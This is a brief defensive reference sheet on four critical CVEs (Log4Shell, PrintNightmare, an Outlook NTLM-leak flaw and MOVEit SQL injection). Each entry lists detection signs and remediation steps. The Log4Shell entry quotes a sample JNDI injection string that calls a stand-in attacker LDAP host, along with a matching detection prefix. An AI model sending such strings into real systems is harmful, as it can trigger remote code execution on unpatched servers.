# CVE Reference

## CVE-2021-44228 — Log4Shell (Apache Log4j)

- Severity: CRITICAL (CVSS 10.0)
- Type: Remote Code Execution
- Affected: Apache Log4j 2.x (2.0-beta9 through 2.14.1)
- Summary: A JNDI lookup in log message processing allows an attacker to load
  remote code via a crafted string such as `${jndi:ldap://attacker/a}`.
- Detection: Log entries containing `${jndi:` prefixes; outbound LDAP/RMI
  connections to unexpected hosts.
- Remediation: Upgrade to Log4j 2.17.0+; remove JndiLookup class; block
  outbound LDAP/RMI.

## CVE-2021-34527 — PrintNightmare (Windows Print Spooler)

- Severity: CRITICAL
- Type: Remote Code Execution / Privilege Escalation
- Affected: Windows Print Spooler service
- Summary: The Print Spooler improperly permits privileged file operations,
  allowing remote code execution with SYSTEM privileges.
- Detection: Spoolsv.exe loading unusual DLLs; remote printer driver installs.
- Remediation: Patch, disable the Print Spooler where not needed, restrict
  Point and Print.

## CVE-2023-23397 — Microsoft Outlook Elevation of Privilege

- Severity: CRITICAL
- Type: Elevation of Privilege (NTLM relay)
- Affected: Microsoft Outlook (Windows)
- Summary: A crafted meeting request triggers an NTLM authentication to an
  attacker-controlled UNC path, leaking the user's Net-NTLMv2 hash.
- Detection: Outlook connecting to SMB paths from calendar items.
- Remediation: Apply patch; block outbound SMB; add firewall rules.

## CVE-2023-34362 — MOVEit Transfer SQL Injection

- Severity: CRITICAL
- Type: SQL Injection → Remote Code Execution
- Affected: MOVEit Transfer
- Summary: SQL injection in MOVEit Transfer allows attackers to exfiltrate
  databases and deploy web shells (exploited by ransomware groups).
- Detection: Unusual web traffic to MOVEit endpoints; unexpected files in
  wwwroot; outbound data transfers from MOVEit servers.
- Remediation: Patch; review IIS logs; hunt for web shells.
